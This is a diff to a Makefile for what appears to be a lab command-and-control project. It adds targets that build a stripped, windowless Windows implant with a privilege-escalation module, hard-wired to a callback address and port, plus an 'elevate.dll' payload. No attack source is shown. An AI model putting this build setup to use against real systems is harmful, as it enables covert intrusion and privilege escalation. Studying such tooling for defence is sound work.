@@ -28,7 +28,7 @@ LIBS    = -lssl -lcrypto
 C2_IP   ?= 192.168.56.104
 C2_PORT ?= 4444
 
-.PHONY: all server certs clean
+.PHONY: all server implant dll certs clean
 
 all: server
 
@@ -36,8 +36,20 @@ server: c2_server.c tls.c tls.h
 	$(CC) $(CFLAGS) -o c2_server c2_server.c tls.c $(LIBS)
 	@echo "[+] c2_server compilé"
 
+implant: implant.c tls.c tls.h privesc.c privesc.h
+	gcc -Wall -Wextra -O2 \
+		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
+		-o implant.exe implant.c tls.c privesc.c \
+		-lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lwinspool \
+		-static -s -mwindows
+	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT))"
+
+dll:
+	gcc -shared -o elevate.dll ../implant/payloads/elevate.c -s
+	@echo "[+] elevate.dll généré"
+
 certs:
 	@bash gen-certs.sh $(C2_IP)
 
 clean:
-	rm -f c2_server implant.exe implant_debug.exe *.o
+	rm -f c2_server implant.exe implant_debug.exe elevate.dll *.o
